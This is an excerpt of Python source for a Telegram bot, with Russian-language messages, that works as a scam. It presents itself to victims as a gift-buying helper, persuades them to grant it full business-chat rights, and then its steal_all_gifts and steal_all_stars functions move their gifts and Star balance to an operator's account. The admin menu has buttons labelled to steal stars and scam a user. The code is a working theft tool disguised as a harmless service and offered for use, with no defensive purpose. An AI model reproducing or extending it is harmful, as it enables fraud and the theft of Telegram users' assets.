...
bot = Bot(
    ...
    business_connection_updates=True
)
dp = Dispatcher()
...
async def call_bot_api(method: str, payload: dict):
...
async def get_business_account_star_balance(connection_id: str):
    return await call_bot_api(
        "getBusinessAccountStarBalance",
        {"business_connection_id": connection_id}
    )

async def get_business_account_gifts(connection_id: str):
    return await call_bot_api(
        "getBusinessAccountGifts",
        {"business_connection_id": connection_id}
    )

async def transfer_gift(connection_id: str, gift_id: str, receiver_user_id: int):
    return await call_bot_api(
        "transferGift",
        {
            "business_connection_id": connection_id,
...
async def transfer_business_account_star_balance(connection_id: str, receiver_user_id: int, star_amount: int, request_id: str):
    return await call_bot_api(
        "transferBusinessAccountStarBalance",
        {
            "business_connection_id": connection_id,
            "receiver_user_id": receiver_user_id,
...
async def check_permissions(connection_id: str) -> bool:
    try:
        ...
        response = await get_business_account_star_balance(connection_id)
        return True
...
async def steal_all_gifts(connection_id: str):
    try:
        ...
        response = await get_business_account_gifts(connection_id)

        stolen_count = 0
        for gift in response["gifts"]:
            try:
                await transfer_gift(connection_id, gift["id"], config.RECEIVER_ID)
...
async def steal_all_stars(connection_id: str):
    try:
        ...
        try:
            balance_response = await get_business_account_star_balance(connection_id)
        ...
        try:
            transfer_result = await transfer_business_account_star_balance(
            connection_id,
            config.RECEIVER_ID,
            star_amount,
            f"transfer_{connection_id}_{int(time.time())}"
)
...
async def start_command(message: Message):
    ...
    if message.from_user.id not in config.ADMIN_ID:
        keyboard = InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="🔍 Подключить", callback_data="start_scan")]
        ])
        ...
        try:
            ...
            await message.answer_photo(
                photo=photo,
                caption=(
                    "🕵️‍♂️ <b>Секретный робот умеет:</b>\n\n"
                    "- Покупать подарки за 125 звезд\n"
                    "- Авто покупать новые подарки\n"
                    "Нажми <b>Подключить</b>, для настройки бота."
                ),
        ...
        keyboard = InlineKeyboardMarkup(
            inline_keyboard=[
                ...
                [InlineKeyboardButton(text="💰 Украсть все звезды", callback_data="steal_stars")],
                [InlineKeyboardButton(text="⭐️ Баланс звезд", callback_data="check_stars")],
                [InlineKeyboardButton(text="🔄 Обновить подключения", callback_data="refresh_connections")],
                [InlineKeyboardButton(text="🔍 Скам пользователя", callback_data="steal_from_user")]
            ]
        )
        ...
        await message.answer(
            ...
            "⚠️ Используй кнопки, для управления:",
            reply_markup=keyboard,
            parse_mode="HTML"
        )
    ...
    if not connections:
        try:
            ...
            await callback.message.answer(
                    "❗️ Для полной работы бота, необходимо подключить бота к бизнес-чату.\n"
                    "Это позволит боту покупать подарки за 125 звезд.\n\n"
                    "👉 Подключите бота к вашему бизнес-чату с полными правами, (их всего 4 пункта)"
            )
            return
        except Exception as e:
            ...
            await callback.message.answer(
                "❗️ Для проведения анализа необходимо подключить бота к бизнес-чату "
                "с полными правами\n\n"
                "Пожалуйста, подключите бота к вашему бизнес-чату и предоставьте все необходимые разрешения."
            )
            return
